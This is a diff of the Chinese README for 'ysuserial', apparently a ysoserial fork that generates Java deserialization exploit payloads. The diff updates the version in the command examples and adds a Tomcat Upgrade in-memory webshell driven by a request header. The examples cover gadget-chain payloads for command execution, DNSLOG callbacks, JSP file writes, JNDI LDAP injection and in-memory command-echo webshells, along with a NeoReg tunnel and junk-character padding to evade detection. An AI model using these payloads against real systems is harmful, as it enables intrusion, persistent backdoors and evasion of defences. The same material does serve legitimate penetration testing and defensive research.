@@ -20,7 +20,7 @@ For English Speaker : [ReadMe_en.md](./ReadMe_en.md)
 项目支持利用链展示：
 
 ```text
-$ java -jar ysuserial-0.7-su18-all.jar
+$ java -jar ysuserial-0.8-su18-all.jar
             _.-^^---....,,--
        _--                  --_
       <                        >)
@@ -146,7 +146,7 @@ ChainedTransformer 进行链式反射调用的利用方式，针对 CC 3.1-3.2.1
 **命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
 ```
 
 效果图：
@@ -156,7 +156,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p PB-lin-b3BlbiAtYS
 **DNSLOG示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'DL-xxx.org'
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'DL-xxx.org'
 ```
 
 效果图：
@@ -166,7 +166,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'DL-xxx.org'
 **脚本引擎解析 JS 代码示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -176,7 +176,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDY
 **文件写入示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
 ```
 
 效果图：
@@ -186,7 +186,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PC
 **触发 JNDI 查询注入示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -196,7 +196,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'JD-ldap://127.0.
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections1 -p 'open -a Calculator.app'
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'open -a Calculator.app'
 ```
 
 效果图：
@@ -257,6 +257,7 @@ Tomcat Listener NeoReg 流量隧道：
 
 - `EX-MS-TWSMSFromThread` : `CMD` 命令回显 WebSocket 内存马
 - `EX-MS-TEXMSFromThread` : `CMD` 命令回显 Executor 内存马
+- `EX-MS-TUGMSFromJMX` : `CMD` 命令回显 Upgrade 内存马
 
 对于一些非常规的环境，本项目还提供了基于 Java 原生的 RMI 内存马及命令回显方式，通过向 RMI 注册中心绑定一个恶意类，可以随时调用执行命令并回显，使用方法例子如下：
 
@@ -273,7 +274,7 @@ Tomcat Listener NeoReg 流量隧道：
 示例：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class
+java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class
 ```
 
 效果图：
@@ -287,7 +288,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.clas
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator.app'
+java -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator.app'
 ```
 
 效果图：
@@ -327,7 +328,7 @@ java -jar ysuserial-0.7-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator
 示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
+java -jar ysuserial-0.8-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
 ```
 
 效果图：
@@ -383,6 +384,10 @@ java -jar ysuserial-0.7-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
    进行 Base64encode 回显。
 
    ![iShot_2022-08-04_15.52.15.png](images/iShot_2022-08-04_15.52.15.png)
+6. 如果是 <font color="orange"> Tomcat Upgrade </font> 内存马，需要指定 `Connection: Upgrade` 以及 `Upgrade: su18`，程序会从 Header 中的 `su18` 中读取待执行的命令，并将结果放回 response 中回显。
+
+   ![iShot_2022-08-23_18.05.42.png](images/iShot_2022-08-23_18.05.42.png)
+
 
 ## NeoReg 隧道类
 
@@ -430,7 +435,7 @@ python neoreg.py -k su18 -u http://xxx.com/ -H 'Referer: https://su18.org/'
 例如：
 
 ```shell
-java -jar ysuserial-0.7-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThread' -d 50000
+java -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThread' -d 50000
 ```
 
 可以生成填充了 50000 个脏字符的序列化数据
@@ -495,5 +500,5 @@ RASP 产品完美防护，欢迎大家联系电话 010-61943626 或邮件 market
 如果编译项目拷贝到其他位置在使用时报错找不到某些依赖的情况，可以使用 `-Djava.ext.dirs` 参数指定依赖目录，例如：
 
 ```shell
-java -Djava.ext.dirs=/Users/su18/JavaProjects/ysoserial/lib -jar ysuserial-0.7-su18-all.jar -g CommonsBeanutils1 -p "EX-MS-TWSMSFromThread"
+java -Djava.ext.dirs=/Users/su18/JavaProjects/ysoserial/lib -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils1 -p "EX-MS-TWSMSFromThread"
 ```
